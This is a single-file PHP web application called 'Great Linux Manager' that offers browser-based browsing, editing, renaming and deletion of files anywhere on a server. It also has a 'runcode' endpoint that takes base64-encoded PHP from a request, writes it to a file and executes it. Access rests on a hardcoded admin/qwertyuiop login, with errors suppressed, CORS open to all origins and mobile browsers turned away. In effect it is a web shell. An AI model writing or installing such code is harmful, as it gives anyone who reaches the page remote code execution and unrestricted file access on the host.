<?php
error_reporting(0);
header('Access-Control-Allow-Origin: *');
date_default_timezone_set('Asia/Shanghai');
//不能修改服务器其他网站数据，关闭防跨站脚本即可
//拒绝手机访问
$agent = strtolower($_SERVER['HTTP_USER_AGENT']);//全部变成小写字母
if(strpos($agent, 'jssdk') and strpos($agent, 'aweme_')){
$type = 'douyinurl';exit;//这里输出抖音浏览器环境结果
}else if(strpos($agent, 'mqqbrowser')){
$type = 'qqurl';exit;//这里输出手机QQ浏览器结果
}else if(strpos($agent, 'qqbrowser')){
$type = 'qqbrowserurl';exit;//这里输出QQ浏览器结果
}else if(strpos($agent, 'micromessenger')){
$type = 'wxurl';exit;//这里输出微信结果
}else if(strpos($agent, 'iphone') || strpos($agent, 'ipad')){
$type = 'iosurl';exit;//这里输出iOS结果
}else if(strpos($agent, 'android')){
$type = 'androidurl';exit;//这里输出android结果
}else{
//不是手机就跳转到电脑端
}
function pass($pass){
    for ($i = 0; $i < 99; $i++) {
         $pass=md5($pass);
    }
    return $pass;
}
//简易的登录验证
$user="admin";$pass="qwertyuiop";
if(@$_REQUEST['user']==$user and @$_REQUEST['pass']==$pass){
    setcookie("user", pass($user), time()+3600*24);  /* 24 小时过期  */
    setcookie("pass", pass($pass), time()+3600*24);  /* 24 小时过期  */
}else if(@$_COOKIE['user']==pass($user) and @$_COOKIE['pass']==pass($pass)){
    
}else{
    die("拒绝访问");
}
function getDir($path){
//获取指定目录的文件列表
    if(is_dir($path)){
        $arr=array();
        
        $arrs=array();
        $dir =  scandir($path);//读取目录
        foreach ($dir as $value){
            $type=array();
            $sub_path =$path .'/'.$value;//拼接路径
            if($value == '.' || $value == '..'){
                // $arrs[]=$sub_path;
                continue;//跳过上级目录
            }else if(is_dir($sub_path)){
                //文件夹在这里
                $type['path']=$sub_path;
                $type['name']=strrev(explode("/",strrev($sub_path))['0']);
                $arrs[]=$type;
                //getDir($sub_path);
            }else{
                //文件在这里
                $type['path']=$sub_path;
                $type['name']=strrev(explode("/",strrev($sub_path))['0']);
                $type['type']=strrev(explode(".",strrev($sub_path))['0']);
                $arr[]=$type;
            }
            
            
        }
        $data=array(
                "folder"=>array_filter($arrs),
                "file"=>array_filter($arr)
                );
        unset($arr,$arrs);
        return $data;
    }else{
        die('3');
    }
}
function is_path_true(){
    if(!empty($_REQUEST['path'])){
                $path=$_REQUEST['path'];
                if(file_exists($path)){
                    return $path;
                }else{
                    return false;
                }
            }else{
                return false;
            }
}
function deldir($path) {
    if (is_dir($path)) {
        $dirs = scandir($path);
        foreach ($dirs as $dir) {
            if ($dir != '.' && $dir != '..') {
                $sonDir = $path.'/'.$dir;
                if (is_dir($sonDir)) {
                    delDir($sonDir);
                    @rmdir($sonDir);
                } else {
                    @unlink($sonDir);
                }
            }
        }
        return @rmdir($path);
    }else if(is_file($path)){
        return @unlink($path);
    }
}
// echo is_path_true();
//处理文件操作
if(!empty($_REQUEST['type'])){
    $type=$_REQUEST['type'];
    switch ($type) {
        case 'getdirs'://获取目录列表
            echo json_encode(getDir(is_path_true()));
            break;
        case 'getfiles':// 获取文件数据
            $data = file_get_contents(is_path_true());
            echo $data ? $data : "\n";
            break;
        case 'filesave':// 更新｜保存文件数据
            echo file_put_contents(is_path_true(),base64_decode($_REQUEST['data']));
            break;
        case 'newfile':// 创建文件
            if(!file_exists($_REQUEST['path'])){
                echo file_put_contents($_REQUEST['path'],"\n");
            }
            break;
        case 'filedels':// 删除文件数据
            echo deldir(is_path_true());
            break;
        case 'rename':// 删除文件数据
            echo rename(is_path_true(),$_REQUEST['newname']);
            break;
        case 'runcode':
            $url=!empty($_REQUEST['data']) ? $_REQUEST['data'] : die("false");

            $path=time().rand(10000,99999).".php";
            
            file_put_contents($path,"<?php\n".base64_decode($url)."\n?>");
            
            include_once($path);
            
            unlink($path);
            break;
        default:// 条件不成立就躺尸
            
            break;
    }
    exit;
}
// echo $_SERVER['DOCUMENT_ROOT'];
// $data=getDir($_SERVER['DOCUMENT_ROOT']."/file_icon");
// echo "<pre>";print_r($data);
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Great Linux Manager</title>
<style>
::-webkit-scrollbar {
    width: 0px;
}
*{
	margin: 0;
	padding: 0;
	box-sizing: border-box;
}
body{
	display: -webkit-flex;
	display: flex;
	flex-flow:row wrap;
	justify-content: space-between;
}
.code{
	background-color: #333;
	width: 70vw;
	height: 92vh;
}
#code{
	padding: 2.5%;
	background-color: #333;
	width: 100%;
	height: 92vh;
	resize: none;
	color: #F8F8F8;
	margin-top: 1%;
}
.view{
	background-color: #f8f8f8;
	width: 30vw;
	height: 93vh;
	overflow-y:scroll;
}
#view{
	border: 0;
	background-color: #f8f8f8;
	width: 100%;
	height: 93vh;
}
input{outline:none;}
ul li{list-style:none;}
.art li{height:50px;line-height:50px;border-bottom:1px dotted #333;}
.art li img{width:25px;height:25px;vertical-align:middle;}
.art li a,.art li span{color:#333;font-size:12px;text-decoration:none;}
.art li a:hover{color:green;}
.art li span{float:right;margin-right:10px;}
.art li span:hover{color:green;}
.address{width:78vw;height:3vh;line-height:3vh;outline:none;border:1px solid #ececec;padding-right:10px;background-color:#fff;}
.re{width:5vw;height:3vh;line-height:3vh;border:1px solid #ececec;font-size:12px;color:#333;background-color:#ececec;}
.re:hover{background-color:green;color:#fff;}
.side{width:100%;height:3vh;margin:0;padding:0;position: fixed;top:3vh;left:0px;}
.side .res{width:10vw;height:3vh;line-height:3vh;border:1px solid #ececec;font-size:12px;color:#333;background-color:#ececec;float:left;}
.side .res:hover{background-color:green;color:#fff;}
#phprun{width:100vw;}
#phpcodes{width:60vw;height:4vh;float:right;background-color:#333;color:green;border:0;padding-left:10px;}
#coderun{width:10vw;height:4vh;float:right;background-color:#333;color:green;border:0}
#coderun:hover{background-color:green;color:#fff;}
</style>
</head>
<body>

    <input id="address" class="address" type="text" value="/www/wwwroot" />
    <input class="re" type="button" onclick="getdirs(document.getElementById('address').value)" value="转到&nbsp;➦" />
    <input class="re" type="button" onclick="newfile()" value="📄&nbsp;新建"/>
    <input class="re" type="button" onclick="repath()" value="🔙&nbsp;上级"/>
    <input class="re" type="button" onclick="filesave()" value="📃&nbsp;保存"/>
    <div class="view">
        
        <div class="side">
            <input class="res" type="button" onclick="repath()" value="🔙&nbsp;上级"/>
            <input class="res" type="button" onclick="newfile()" value="📄&nbsp;新建"/>
            <input class="res" type="button" onclick="upload()" value="📤&nbsp;上传"/>  
        </div>
        <br />
		<ul class="art" id="view">
		    <!--<li><img src="/file_icon/folder.png" /><a onclick="getdirs(this.title)" title="path" href="javascript:void(0);" >admin</a></li>-->
		    <!--<li><img src="/file_icon/php.png" /><a onclick="getfiles(this.title)" title="path" href="javascript:void(0);">indexxxxxxxx.php</a><span onclick="filedels(path)">删除</span><span onclick="filerename(path,name)">重命名</span><span onclick="getfiles(path)">修改</span></li>-->
		</ul>
	</div>
	<div class="code">
		<div id="code"></div>
	</div>
	<div id="phprun">
	    <input type="button" id="coderun" value="Run&nbsp;Code" onclick="runcode()"/>
	    <input type="text" id="phpcodes" value="echo time();"/>
	</div>
<form id="formdata" enctype="multipart/form-data">
  <input id="file" type="file" name="file[]" multiple style="display:none;" onchange="uploading()"/>
</form>	
<script src="http://cdn.staticfile.org/ace/1.4.14/ace.min.js"></script>
<script src="http://cdn.staticfile.org/ace/1.4.14/ext-language_tools.js"></script>
<script src="https://cdn.staticfile.org/jquery/3.6.0/jquery.min.js"></script>
<script>
var filepath=false;
var editor=false;
ace.config.set("basePath", "http://cdn.staticfile.org/ace/1.4.14/");
ace.require("ace/ext/language_tools");
function aceedit(language){
    if(editor){
        editor.destroy();
        editor.container.remove();
    }
    
    editor = ace.edit("code");
    editor.setOptions({
        enableBasicAutocompletion: true,
        enableSnippets: true,
        enableLiveAutocompletion: true
    });
    editor.session.setUseWrapMode(true);//切换自动换行
    document.getElementById('code').style.fontSize='14px';//设置字体大小
    editor.setHighlightActiveLine(false);//设置行高亮显示
    editor.setShowPrintMargin(false);//设置打印边距可见性
    //editor.getSession().setUseWorker(false);取消语言模式的语法检查
    editor.setTheme("ace/theme/monokai");
    editor.getSession().setMode("ace/mode/"+language);
    //editor.getSession().setMode("ace/mode/css");
    //editor.getSession().setMode("ace/mode/javascript");
    var code = document.getElementById("code");
    var view = document.getElementById("view");
    editor.execCommand ('find');//编辑内容搜索
    // editor.replaceAll('bar');
    editor.getSession().on ('change', function (e) {
                //  view.innerHTML=editor.getValue ();//获得输入内容
                // editor.setValue (editorValue);//设置输入内容
                // editor.moveCursorTo (0, 0);// 移动光标至第 0 行，第 0 列
                
                
            });
}
aceedit("php");
function setCookie(cname,cvalue,exdays){
    var d = new Date();
    d.setTime(d.getTime()+(exdays*24*60*60*1000));
    var expires = "expires="+d.toGMTString();
    document.cookie = cname+"="+cvalue+"; "+expires;
}
function getCookie(cname){
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for(var i=0; i<ca.length; i++) {
        var c = ca[i].trim();
        if (c.indexOf(name)==0) { return c.substring(name.length,c.length); }
    }
    return "";
}
function getdirs(path){
    path =path.replace('//', '/');
    var str="";
    $.get("/?type=getdirs&path="+path,function(data,status){
        if(data){
            data=JSON.parse(data);
            if(data['folder']){
                for(var i=0; i<data['folder'].length; i++){
                    str+='<li><img src="/file_icon/folder.png" /><a onclick="getdirs(this.title)" title="'+data['folder'][i]['path']+'" href="javascript:void(0);" >'+data['folder'][i]['name'].slice(0,15)+'</a><span onclick="filedels(\''+data['folder'][i]['path']+'\')">删除</span><span onclick="filerename(\''+data['folder'][i]['path']+'\')">重命名</span></li>';
                }
            }
            if(data['file']){
                for(var i=0; i<data['file'].length; i++){
                    str+='<li><img src="/file_icon/'+data['file'][i]['type']+'.png" onerror="this.src=\'/file_icon/txt.png\'"/><a onclick="getfiles(this.title)" title="'+data['file'][i]['path']+'" href="javascript:void(0);">'+data['file'][i]['name'].slice(0,60)+'</a><span onclick="filedels(\''+data['file'][i]['path']+'\')">删除</span><span onclick="filerename(\''+data['file'][i]['path']+'\')">重命名</span><span onclick="getfiles(\''+data['file'][i]['path']+'\')">修改</span></li>';
                }
            }
            document.getElementById("view").innerHTML=str;
            document.getElementById("address").value=path;
            setCookie("filepaths",path,365);
        }else{
            alert("目录不存在！");
        }
    });
}
if(getCookie("filepaths")){
    getdirs(getCookie("filepaths"));
}else{
    getdirs('<?php echo $_SERVER['DOCUMENT_ROOT']; ?>');
}

function newfile(){
    var name=prompt("请输入文件名","newfile.php")
  if (name){
        $.get("/?type=newfile&path="+document.getElementById("address").value+"/"+name,function(data,status){
            if(data){
                getdirs(document.getElementById("address").value);
            }else{
                alert("文件已存在！"+data);
            }
        });
    }
}
function repath(){
    var repath=document.getElementById("address").value.split("/").length-1;
    repath=document.getElementById("address").value.split("/",repath).join("/").replace('//', '/');
    if(repath){
        getdirs(repath);
    }else{
        getdirs("/");
    }
    filepath=false;
    editor.setValue("");
}
function base64(str,code) {
if(code==0){return window.btoa(unescape(encodeURIComponent(str)));}else if(code==1){return decodeURIComponent(escape(window.atob(str)));}
}

function getfiles(path){
    if (path){
        $.get("/?type=getfiles&path="+path,function(data,status){
            if(data){
                filepath=path;
                editor.setValue(data);
            }else{
                alert("文件不存在！"+data);
            }
        });
    }
}
function filesave(){
    if (filepath){
        if(editor.getValue().length>1){
            $.post("/?type=filesave&path="+filepath,{data:base64(editor.getValue(),0)},function(data,status){
                if(data){
                    alert("保存成功");
                }else{
                    alert("文件不存在！"+data);
                }
            });
        }
    }
    
}
function filerename(path){
    var newname=path.split("/").length-1;
    newname=path.split("/",newname).join("/");
    var name=prompt("请输入新的文件名","")
    if (name){
        $.get("/?type=rename&path="+path+"&newname="+newname+"/"+name,function(data,status){
            if(data){
                getdirs(document.getElementById("address").value);
            }else{
                alert("重命名失败");
            }
        });
    }
}
function filedels(path){
    if (path){
        var r=confirm("确认要删除？");
        if(r){
            $.get("/?type=filedels&path="+path,function(data,status){
                if(data){
                    alert("删除成功");
                    getdirs(document.getElementById("address").value);
                }
            });
        }
    }
}
function runcode(){
    var codes = document.getElementById("phpcodes").value;
    console.log(codes)
    if(codes){
        codes = base64(codes,0);
        $.post("/?type=runcode",{data:codes},function(data,status){
                if(data){
                    console.log(data);
                }
        });
    }
}
// var html = document.getElementById("").innerHTML;
// editor.insert(html);//插入文本
function upload(){
    document.getElementById("file").click();
}
function uploading(){
    var fdata=document.getElementById("formdata");
    var data = new FormData(fdata);
    $.ajax({ 
    url:"/upload/upload.php", 
        type:"post", 
        data:data, 
        processData:false, 
        contentType:false, 
        success:function(res){ 
        res=JSON.parse(res);
            if(res.error==0){ 
                // alert("上传成功！"); 
                getdirs(document.getElementById("address").value);
            }else{
                alert("上传失败,请检查目录权限，ERROR："+res.error);
            }
        }
    });
}
</script>
</body>
</html>
